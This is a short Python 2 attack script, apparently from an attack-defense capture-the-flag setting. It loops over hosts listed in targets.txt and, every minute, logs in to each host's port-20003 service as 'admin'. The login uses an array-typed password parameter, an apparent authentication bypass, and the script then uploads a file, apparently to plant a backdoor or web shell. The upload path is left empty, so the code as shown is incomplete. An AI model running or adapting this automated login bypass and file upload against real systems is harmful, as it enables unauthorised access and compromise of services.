import requests
import logging
import traceback
import time

l=logging.DEBUG
#l=logging.INFO
logging.basicConfig(level=l,format='%(asctime)s %(levelname)s [%(filename)s:%(lineno)d] %(message)s',datefmt='%a, %d %b %Y %H:%M:%S')
targets=[]
#p=r'../getFlag/targets.txt'
p=r'targets.txt'
for line in open(p).readlines():
    targets.append(line.strip())
    logging.debug(line.strip())

ma=r''
while True:
    for t in targets:
        try:
            url=r'http://'+t+':20003/users/login'
            pdata={'csrf':'362230c2d1f1e042b639edc72bd5e52ec6320276','username':'admin','password[]':'jsepc123!','login_submit':'Log+In'}
            s=requests.session()
            s.post(url=url,data=pdata)
            files={'file':open(ma)}
            s.post(url,files=files)
        except Exception,e:
            logging.debug(traceback.format_exc())
    time.sleep(60)
